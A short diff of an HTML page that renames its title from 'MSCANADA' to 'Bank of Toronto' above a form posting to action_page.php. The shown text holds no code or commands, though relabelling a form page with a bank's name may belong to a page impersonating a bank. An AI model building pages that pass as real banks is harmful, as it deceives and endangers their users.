@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>MSCANADA</title>
+<title>Bank of Toronto</title>
 </head>
 <body bgcolor="#FAEBE7">
 <form action="action_page.php" method="post">
